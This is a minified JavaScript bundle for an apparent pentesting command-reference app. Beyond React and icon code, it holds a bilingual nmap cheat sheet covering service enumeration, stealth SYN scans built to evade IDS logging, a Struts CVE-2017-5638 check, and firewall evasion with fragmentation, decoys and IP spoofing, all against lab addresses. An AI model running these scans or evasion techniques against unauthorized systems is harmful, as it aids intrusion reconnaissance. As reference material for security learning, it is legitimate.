i=zl(l.href),n=a.querySelector(Li(i));if(n){a=n._p,a!==null&&typeof a=="object"&&typeof a.then=="function"&&(e.count++,e=Yn.bind(e),a.then(e,e)),t.state.loading|=4,t.instance=n,Ge(n);return}n=a.ownerDocument||a,l=of(l),(i=Ua.get(i))&&or(l,i),n=n.createElement("link"),Ge(n);var s=n;s._p=new Promise(function(o,r){s.onload=o,s.onerror=r}),Ye(n,"link",l),t.instance=n}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(t,a),(a=t.state.preload)&&(t.state.loading&3)===0&&(e.count++,t=Yn.bind(e),a.addEventListener("load",t),a.addEventListener("error",t))}}var cr=0;function Kp(e,a){return e.stylesheets&&e.count===0&&Xn(e,e.stylesheets),0<e.count||0<e.imgCount?function(t){var l=setTimeout(function(){if(e.stylesheets&&Xn(e,e.stylesheets),e.unsuspend){var n=e.unsuspend;e.unsuspend=null,n()}},6e4+a);0<e.imgBytes&&cr===0&&(cr=62500*_p());var i=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&Xn(e,e.stylesheets),e.unsuspend)){var n=e.unsuspend;e.unsuspend=null,n()}},(e.imgBytes>cr?50:800)+a);return e.unsuspend=t,function(){e.unsuspend=null,clearTimeout(l),clearTimeout(i)}}:null}function Yn(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)Xn(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var Qn=null;function Xn(e,a){e.stylesheets=null,e.unsuspend!==null&&(e.count++,Qn=new Map,a.forEach(Wp,e),Qn=null,Yn.call(e))}function Wp(e,a){if(!(a.state.loading&4)){var t=Qn.get(e);if(t)var l=t.get(null);else{t=new Map,Qn.set(e,t);for(var i=e.querySelectorAll("link[data-precedence],style[data-precedence]"),n=0;n<i.length;n++){var s=i[n];(s.nodeName==="LINK"||s.getAttribute("media")!=="not all")&&(t.set(s.dataset.precedence,s),l=s)}l&&t.set(null,l)}i=a.instance,s=i.getAttribute("data-precedence"),n=t.get(s)||l,n===l&&t.set(null,i),t.set(s,i),this.count++,l=Yn.bind(this),i.addEventListener("load",l),i.addEventListener("error",l),n?n.parentNode.insertBefore(i,n.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(i,e.firstChild)),a.state.loading|=4}}var Ii={$$typeof:qe,Provider:null,Consumer:null,_currentValue:q,_currentValue2:q,_threadCount:0};function $p(e,a,t,l,i,n,s,o,r){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=ls(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=ls(0),this.hiddenUpdates=ls(null),this.identifierPrefix=l,this.onUncaughtError=i,this.onCaughtError=n,this.onRecoverableError=s,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=r,this.incompleteTransitions=new Map}function ff(e,a,t,l,i,n,s,o,r,g,A,C){return e=new $p(e,a,t,s,r,g,A,C,o),a=1,n===!0&&(a|=24),n=pa(3,null,null,a),e.current=n,n.stateNode=e,a=Hs(),a.refCount++,e.pooledCache=a,a.refCount++,n.memoizedState={element:l,isDehydrated:t,cache:a},Js(n),e}function mf(e){return e?(e=pl,e):pl}function pf(e,a,t,l,i,n){i=mf(i),l.context===null?l.context=i:l.pendingContext=i,l=bt(a),l.payload={element:t},n=n===void 0?null:n,n!==null&&(l.callback=n),t=At(e,l,a),t!==null&&(oa(t,e,a),ri(t,e,a))}function hf(e,a){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<a?t:a}}function ur(e,a){hf(e,a),(e=e.alternate)&&hf(e,a)}function gf(e){if(e.tag===13||e.tag===31){var a=Ht(e,67108864);a!==null&&oa(a,e,67108864),ur(e,67108864)}}function vf(e){if(e.tag===13||e.tag===31){var a=Aa();a=is(a);var t=Ht(e,a);t!==null&&oa(t,e,a),ur(e,a)}}var Zn=!0;function eh(e,a,t,l){var i=y.T;y.T=null;var n=N.p;try{N.p=2,dr(e,a,t,l)}finally{N.p=n,y.T=i}}function ah(e,a,t,l){var i=y.T;y.T=null;var n=N.p;try{N.p=8,dr(e,a,t,l)}finally{N.p=n,y.T=i}}function dr(e,a,t,l){if(Zn){var i=fr(l);if(i===null)Ko(e,a,l,Vn,t),Af(e,l);else if(lh(i,e,a,t,l))l.stopPropagation();else if(Af(e,l),a&4&&-1<th.indexOf(e)){for(;i!==null;){var n=ll(i);if(n!==null)switch(n.tag){case 3:if(n=n.stateNode,n.current.memoizedState.isDehydrated){var s=zt(n.pendingLanes);if(s!==0){var o=n;for(o.pendingLanes|=2,o.entangledLanes|=2;s;){var r=1<<31-fa(s);o.entanglements[1]|=r,s&=~r}Ha(n),(ue&6)===0&&(Un=H()+500,Si(0))}}break;case 31:case 13:o=Ht(n,2),o!==null&&oa(o,n,2),Rn(),ur(n,2)}if(n=fr(l),n===null&&Ko(e,a,l,Vn,t),n===i)break;i=n}i!==null&&l.stopPropagation()}else Ko(e,a,l,null,t)}}function fr(e){return e=ms(e),mr(e)}var Vn=null;function mr(e){if(Vn=null,e=tl(e),e!==null){var a=B(e);if(a===null)e=null;else{var t=a.tag;if(t===13){if(e=W(a),e!==null)return e;e=null}else if(t===31){if(e=de(a),e!==null)return e;e=null}else if(t===3){if(a.stateNode.current.memoizedState.isDehydrated)return a.tag===3?a.stateNode.containerInfo:null;e=null}else a!==e&&(e=null)}}return Vn=e,null}function bf(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(ze()){case Ba:return 2;case ka:return 8;case Ma:case Pf:return 32;case Nr:return 268435456;default:return 32}default:return 32}}var pr=!1,It=null,_t=null,Ut=null,_i=new Map,Ui=new Map,Mt=[],th="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function Af(e,a){switch(e){case"focusin":case"focusout":It=null;break;case"dragenter":case"dragleave":_t=null;break;case"mouseover":case"mouseout":Ut=null;break;case"pointerover":case"pointerout":_i.delete(a.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ui.delete(a.pointerId)}}function Mi(e,a,t,l,i,n){return e===null||e.nativeEvent!==n?(e={blockedOn:a,domEventName:t,eventSystemFlags:l,nativeEvent:n,targetContainers:[i]},a!==null&&(a=ll(a),a!==null&&gf(a)),e):(e.eventSystemFlags|=l,a=e.targetContainers,i!==null&&a.indexOf(i)===-1&&a.push(i),e)}function lh(e,a,t,l,i){switch(a){case"focusin":return It=Mi(It,e,a,t,l,i),!0;case"dragenter":return _t=Mi(_t,e,a,t,l,i),!0;case"mouseover":return Ut=Mi(Ut,e,a,t,l,i),!0;case"pointerover":var n=i.pointerId;return _i.set(n,Mi(_i.get(n)||null,e,a,t,l,i)),!0;case"gotpointercapture":return n=i.pointerId,Ui.set(n,Mi(Ui.get(n)||null,e,a,t,l,i)),!0}return!1}function yf(e){var a=tl(e.target);if(a!==null){var t=B(a);if(t!==null){if(a=t.tag,a===13){if(a=W(t),a!==null){e.blockedOn=a,Mr(e.priority,function(){vf(t)});return}}else if(a===31){if(a=de(t),a!==null){e.blockedOn=a,Mr(e.priority,function(){vf(t)});return}}else if(a===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Kn(e){if(e.blockedOn!==null)return!1;for(var a=e.targetContainers;0<a.length;){var t=fr(e.nativeEvent);if(t===null){t=e.nativeEvent;var l=new t.constructor(t.type,t);fs=l,t.target.dispatchEvent(l),fs=null}else return a=ll(t),a!==null&&gf(a),e.blockedOn=t,!1;a.shift()}return!0}function Tf(e,a,t){Kn(e)&&t.delete(a)}function ih(){pr=!1,It!==null&&Kn(It)&&(It=null),_t!==null&&Kn(_t)&&(_t=null),Ut!==null&&Kn(Ut)&&(Ut=null),_i.forEach(Tf),Ui.forEach(Tf)}function Wn(e,a){e.blockedOn===a&&(e.blockedOn=null,pr||(pr=!0,T.unstable_scheduleCallback(T.unstable_NormalPriority,ih)))}var $n=null;function Ef(e){$n!==e&&($n=e,T.unstable_scheduleCallback(T.unstable_NormalPriority,function(){$n===e&&($n=null);for(var a=0;a<e.length;a+=3){var t=e[a],l=e[a+1],i=e[a+2];if(typeof l!="function"){if(mr(l||t)===null)continue;break}var n=ll(t);n!==null&&(e.splice(a,3),a-=3,fo(n,{pending:!0,data:i,method:t.method,action:l},l,i))}}))}function Gl(e){function a(r){return Wn(r,e)}It!==null&&Wn(It,e),_t!==null&&Wn(_t,e),Ut!==null&&Wn(Ut,e),_i.forEach(a),Ui.forEach(a);for(var t=0;t<Mt.length;t++){var l=Mt[t];l.blockedOn===e&&(l.blockedOn=null)}for(;0<Mt.length&&(t=Mt[0],t.blockedOn===null);)yf(t),t.blockedOn===null&&Mt.shift();if(t=(e.ownerDocument||e).$$reactFormReplay,t!=null)for(l=0;l<t.length;l+=3){var i=t[l],n=t[l+1],s=i[aa]||null;if(typeof n=="function")s||Ef(t);else if(s){var o=null;if(n&&n.hasAttribute("formAction")){if(i=n,s=n[aa]||null)o=s.formAction;else if(mr(i)!==null)continue}else o=s.action;typeof o=="function"?t[l+1]=o:(t.splice(l,3),l-=3),Ef(t)}}}function Cf(){function e(n){n.canIntercept&&n.info==="react-transition"&&n.intercept({handler:function(){return new Promise(function(s){return i=s})},focusReset:"manual",scroll:"manual"})}function a(){i!==null&&(i(),i=null),l||setTimeout(t,20)}function t(){if(!l&&!navigation.transition){var n=navigation.currentEntry;n&&n.url!=null&&navigation.navigate(n.url,{state:n.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var l=!1,i=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",a),navigation.addEventListener("navigateerror",a),setTimeout(t,100),function(){l=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",a),navigation.removeEventListener("navigateerror",a),i!==null&&(i(),i=null)}}}function hr(e){this._internalRoot=e}es.prototype.render=hr.prototype.render=function(e){var a=this._internalRoot;if(a===null)throw Error(p(409));var t=a.current,l=Aa();pf(t,l,e,a,null,null)},es.prototype.unmount=hr.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var a=e.containerInfo;pf(e.current,2,null,e,null,null),Rn(),a[al]=null}};function es(e){this._internalRoot=e}es.prototype.unstable_scheduleHydration=function(e){if(e){var a=Ur();e={blockedOn:null,target:e,priority:a};for(var t=0;t<Mt.length&&a!==0&&a<Mt[t].priority;t++);Mt.splice(t,0,e),t===0&&yf(e)}};var Sf=F.version;if(Sf!=="19.2.7")throw Error(p(527,Sf,"19.2.7"));N.findDOMNode=function(e){var a=e._reactInternals;if(a===void 0)throw typeof e.render=="function"?Error(p(188)):(e=Object.keys(e).join(","),Error(p(268,e)));return e=O(a),e=e!==null?w(e):null,e=e===null?null:e.stateNode,e};var nh={bundleType:0,version:"19.2.7",rendererPackageName:"react-dom",currentDispatcherRef:y,reconcilerVersion:"19.2.7"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var as=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!as.isDisabled&&as.supportsFiber)try{Pl=as.inject(nh),da=as}catch{}}return wi.createRoot=function(e,a){if(!x(e))throw Error(p(299));var t=!1,l="",i=Iu,n=_u,s=Uu;return a!=null&&(a.unstable_strictMode===!0&&(t=!0),a.identifierPrefix!==void 0&&(l=a.identifierPrefix),a.onUncaughtError!==void 0&&(i=a.onUncaughtError),a.onCaughtError!==void 0&&(n=a.onCaughtError),a.onRecoverableError!==void 0&&(s=a.onRecoverableError)),a=ff(e,1,!1,null,null,t,l,null,i,n,s,Cf),e[al]=a.current,Vo(e),new hr(a)},wi.hydrateRoot=function(e,a,t){if(!x(e))throw Error(p(299));var l=!1,i="",n=Iu,s=_u,o=Uu,r=null;return t!=null&&(t.unstable_strictMode===!0&&(l=!0),t.identifierPrefix!==void 0&&(i=t.identifierPrefix),t.onUncaughtError!==void 0&&(n=t.onUncaughtError),t.onCaughtError!==void 0&&(s=t.onCaughtError),t.onRecoverableError!==void 0&&(o=t.onRecoverableError),t.formState!==void 0&&(r=t.formState)),a=ff(e,1,!0,a,t??null,l,i,r,n,s,o,Cf),a.context=mf(null),t=a.current,l=Aa(),l=is(l),i=bt(l),i.callback=null,At(t,i,l),t=l,a.current.lanes=t,kl(a,t),Ha(a),e[al]=a.current,Vo(e),new es(a)},wi.version="19.2.7",wi}var Rf;function vh(){if(Rf)return br.exports;Rf=1;function T(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(T)}catch(F){console.error(F)}}return T(),br.exports=gh(),br.exports}var bh=vh();/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ah=T=>T.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),yh=T=>T.replace(/^([A-Z])|[\s-_]+(\w)/g,(F,M,p)=>p?p.toUpperCase():M.toLowerCase()),wf=T=>{const F=yh(T);return F.charAt(0).toUpperCase()+F.slice(1)},Hf=(...T)=>T.filter((F,M,p)=>!!F&&F.trim()!==""&&p.indexOf(F)===M).join(" ").trim(),Th=T=>{for(const F in T)if(F.startsWith("aria-")||F==="role"||F==="title")return!0};/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */var Eh={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ch=ye.forwardRef(({color:T="currentColor",size:F=24,strokeWidth:M=2,absoluteStrokeWidth:p,className:x="",children:B,iconNode:W,...de},D)=>ye.createElement("svg",{ref:D,...Eh,width:F,height:F,stroke:T,strokeWidth:p?Number(M)*24/Number(F):M,className:Hf("lucide",x),...!B&&!Th(de)&&{"aria-hidden":"true"},...de},[...W.map(([O,w])=>ye.createElement(O,w)),...Array.isArray(B)?B:[B]]));/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ve=(T,F)=>{const M=ye.forwardRef(({className:p,...x},B)=>ye.createElement(Ch,{ref:B,iconNode:F,className:Hf(`lucide-${Ah(wf(T))}`,`lucide-${T}`,p),...x}));return M.displayName=wf(T),M};/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Sh=[["path",{d:"M12 7v14",key:"1akyts"}],["path",{d:"M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",key:"ruj8y"}]],Oh=Ve("book-open",Sh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const xh=[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]],Nh=Ve("check",xh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Lh=[["path",{d:"m16 18 6-6-6-6",key:"eg8j8"}],["path",{d:"m8 6-6 6 6 6",key:"ppft3o"}]],Dh=Ve("code",Lh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ih=[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]],zf=Ve("copy",Ih);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const _h=[["path",{d:"M12 15V3",key:"m9g1x1"}],["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["path",{d:"m7 10 5 5 5-5",key:"brsn70"}]],Uh=Ve("download",_h);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Mh=[["path",{d:"m15.5 7.5 2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4",key:"g0fldk"}],["path",{d:"m21 2-9.6 9.6",key:"1j0ho8"}],["circle",{cx:"7.5",cy:"15.5",r:"5.5",key:"yqb3hr"}]],Rh=Ve("key",Mh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const wh=[["path",{d:"M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z",key:"zw3jo"}],["path",{d:"M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12",key:"1wduqc"}],["path",{d:"M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17",key:"kqbvx6"}]],zh=Ve("layers",wh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Fh=[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"M12 5v14",key:"s699le"}]],Er=Ve("plus",Fh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Gh=[["path",{d:"M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",key:"v9h5vc"}],["path",{d:"M21 3v5h-5",key:"1q7to0"}],["path",{d:"M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",key:"3uifl3"}],["path",{d:"M8 16H3v5",key:"1cv678"}]],jh=Ve("refresh-cw",Gh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const qh=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]],Hh=Ve("shield",qh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ph=[["path",{d:"M10 8h4",key:"1sr2af"}],["path",{d:"M12 21v-9",key:"17s77i"}],["path",{d:"M12 8V3",key:"13r4qs"}],["path",{d:"M17 16h4",key:"h1uq16"}],["path",{d:"M19 12V3",key:"o1uvq1"}],["path",{d:"M19 21v-5",key:"qua636"}],["path",{d:"M3 14h4",key:"bcjad9"}],["path",{d:"M5 10V3",key:"cb8scm"}],["path",{d:"M5 21v-7",key:"1w1uti"}]],Cr=Ve("sliders-vertical",Ph);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Bh=[["path",{d:"M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z",key:"r04s7s"}]],Sr=Ve("star",Bh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const kh=[["path",{d:"M12 19h8",key:"baeox8"}],["path",{d:"m4 17 6-6-6-6",key:"1yngyt"}]],Or=Ve("terminal",kh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Jh=[["path",{d:"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6",key:"miytrc"}],["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2",key:"e791ji"}]],Yh=Ve("trash",Jh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Qh=[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]],Xh=Ve("triangle-alert",Qh);/**
 * @license lucide-react v0.546.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Zh=[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]],Ff=Ve("x",Zh),Fa={nmap:{name:"nmap",description:"Network Mapper - Escaneo y descubrimiento de servicios de red",descriptionEn:"Network Mapper - Network scanning, host discovery, and vulnerability auditing",category:"Reconocimiento",rawText:`===CASO===
TITULO: Detección exhaustiva de servicios y versiones con scripts básicos
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nmap -sC -sV -p- -oN <output_file> <target_ip>

FLAGS:
-sC → Ejecuta los scripts de enumeración estándar integrados en Nmap (NSE) para identificar vulnerabilidades obvias o configuraciones incorrectas comunes.
-sV → Intenta determinar el nombre de la versión exacta de los servicios expuestos en los puertos abiertos.
-p- → Escanea los 65535 puertos TCP en lugar de los 1000 puertos comunes por defecto.
-oN → Guarda los resultados del escaneo en formato de texto normal legible.

EJEMPLO:
nmap -sC -sV -p- -oN nmap_exhaustivo.txt 10.10.11.189

TIP: Si el host bloquea pings ICMP (típico en Windows Defender), añade la opción -Pn. Para acelerar el escaneo en redes fiables sin despertar alarmas masivas de IPS, usa -T4.
===FIN===

===CASO===
TITULO: Descubrimiento sigiloso de puertos TCP SYN para evitar el registro total de conexión
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
sudo nmap -sS -Pn --randomize-hosts --scan-delay <delay_time> <target_ip_range>

FLAGS:
-sS → Envía banderas TCP SYN de forma silenciosa sin completar el saludo de 3 vías (half-open scanning), reduciendo registros en sistemas legacy.
-Pn → Omite la fase de descubrimiento de hosts activa (asume que todos los hosts indicados están vivos).
--randomize-hosts → Altera aleatoriamente el orden de las IPs del rango a escanear para mitigar patrones correlativos detectables por IDS.
--scan-delay → Introduce un intervalo de espera específico entre cada paquete de sondeo para evadir umbrales de rate-limiting.

EJEMPLO:
sudo nmap -sS -Pn --randomize-hosts --scan-delay 1500ms 10.10.10.0/24

TIP: El escaneo SYN (-sS) requiere privilegios de Root (sudo) para crear sockets crudos en el sistema Linux.
===FIN===

===CASO===
TITULO: Enumeración dirigida de vulnerabilidades HTTP específicas mediante el motor de scripts NSE
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
nmap -p <port> --script http-vuln-cve2017-5638 --script-args path=<uri_endpoint> <target_ip>

FLAGS:
-p → Especifica el puerto TCP exacto expuesto que corre el servidor HTTP vulnerable.
--script → Invoca un script NSE específico de auditoria, en este caso para detectar vulnerabilidades críticas de Apache Struts.
--script-args → Envía parámetros personalizados directamente al script de Nmap, como la ruta de la aplicación.

EJEMPLO:
nmap -p 8080 --script http-vuln-cve2017-5638 --script-args path=/showcase.action 10.10.14.45

TIP: Puedes buscar scripts locales de Nmap usando "ls /usr/share/nmap/scripts/ | grep http-" para hallar más herramientas de auditoría útiles.
===FIN===

===CASO===
TITULO: Descubrimiento de hosts de red por UDP rápido
CATEGORIA: Reconocimiento
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
sudo nmap -sU -p <udp_ports> --max-retries 1 <target_ip>

FLAGS:
-sU → Activa el escaneo de puertos UDP para identificar servicios como DNS, SNMP, TFTP o DHCP.
-p → Indica la lista de puertos UDP clásicos de interés para optimizar tiempo de respuesta.
--max-retries → Limita el número de reintentos por puerto para acelerar el escaneo, dado que UDP no garantiza entrega y el timeout original es muy largo.

EJEMPLO:
sudo nmap -sU -p 53,161,162,137,138 --max-retries 1 10.10.10.254

TIP: Los servicios UDP son propensos a dar falsos positivos por filtrados o simplemente no contestar. Siempre valida con una herramienta específica (ej: dig para DNS, onesixtyone para SNMP).
===FIN===

===CASO===
TITULO: Escaneo táctico con evasión de Firewall (Fragmentado y Spoofing con Decoys)
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
sudo nmap -f -D <decoy_ip1>,<decoy_ip2>,ME -S <spoof_ip> -e <interface> -g <source_port> <target_ip>

FLAGS:
-f → Fragmenta los paquetes IP en tamaños pequeños (8 bytes tras la cabecera) para dificultar su reensamblaje en cortafuegos sencillos.
-D → Enmascara la dirección IP del atacante mezclándola en la red con señuelos ficticios para saturar los logs del syslog host.
-S → Suplanta la dirección de origen para aparentar que el sondeo proviene de otra terminal del sistema.
-e → Asigna de forma explícita la interfaz de red para enviar las tramas.
-g → Envía el tráfico simulando que se genera desde un puerto específico común para evadir filtrados (como puerto 53 de DNS o 88 de Kerberos).

EJEMPLO:
sudo nmap -f -D 10.10.10.5,10.10.10.12,ME -S 10.10.10.99 -e eth0 -g 53 10.10.10.150

TIP: El spoofing de IP completo con "-S" puede impedir recibir las respuestas si tu red interna no tiene habilitado IP forwarding o no rutea de vuelta a tu terminal.
===FIN===`,rawTextEn:`===CASO===
TITULO: Comprehensive service and version detection with standard scripts
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nmap -sC -sV -p- -oN <output_file> <target_ip>

FLAGS:
-sC → Run standard host discovery scripts integrated into Nmap (NSE) to detect common vulnerabilities or misconfigurations.
-sV → Attempt to determine the precise service version of ports running on active targets.
-p- → Scan all 65535 TCP ports instead of the default top 1000 ports.
-oN → Output results to a normal, easy-to-read text file.

EJEMPLO:
nmap -sC -sV -p- -oN nmap_exhaustive.txt 10.10.11.189

TIP: If the target host blocks ICMP pings (typical on Windows Defender), add the -Pn flag. To speed up scanning on reliable local networks without causing mass IPS alerts, use -T4.
===FIN===

===CASO===
TITULO: Stealth TCP SYN port discovery to avoid connection logging
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
sudo nmap -sS -Pn --randomize-hosts --scan-delay <delay_time> <target_ip_range>

FLAGS:
-sS → Send TCP SYN flags silently without completing the 3-way handshake (half-open scanning), reducing system log entries.
-Pn → Skip the host discovery phase (assume all specified target hosts are live).
--randomize-hosts → Aligns target IP scanning sequence randomly to mitigate IDS correlation detection.
--scan-delay → Insert a specified delay interval between each probe packet to bypass firewalls rate-limiting thresholds.

EJEMPLO:
sudo nmap -sS -Pn --randomize-hosts --scan-delay 1500ms 10.10.10.0/24

TIP: SYN scanning (-sS) requires Root privileges (sudo) to spawn raw sockets in the Linux kernel.
===FIN===

===CASO===
TITULO: Targeted HTTP vulnerability scanning using the NSE script engine
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
nmap -p <port> --script http-vuln-cve2017-5638 --script-args path=<uri_endpoint> <target_ip>

FLAGS:
-p → Specifies the exact TCP port of the target HTTP server.
